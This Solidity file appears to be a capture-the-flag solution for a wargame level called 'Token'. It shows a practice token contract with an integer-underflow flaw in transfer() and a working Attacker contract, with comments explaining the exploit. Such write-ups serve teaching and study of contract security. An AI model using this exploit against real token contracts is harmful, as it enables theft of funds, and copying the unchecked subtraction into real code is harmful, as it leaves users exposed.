//////////////////////////////////////
// Level 5 - Token
// By: Lorenzo Cesconetto
//////////////////////////////////////

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

//  SOLUTION:
// Just call transfer(address(0), currentBalance + 1);
// balances[msg.sender] - _value; will underflow and will be larger than zero
// balances[msg.sender] -= _value; will underflow and will set our balance to the largest uint
// balances[_to] += _value; is sent to address(0). If sent to our address, it would overflow our balance.
contract Attacker {
    Token token;

    constructor(address _addr) public {
        token = Token(_addr);
    }

    function underflowTransfer() external {
        uint balance = token.balanceOf(msg.sender);
        token.transfer(address(0), balance + 1);
    }
}
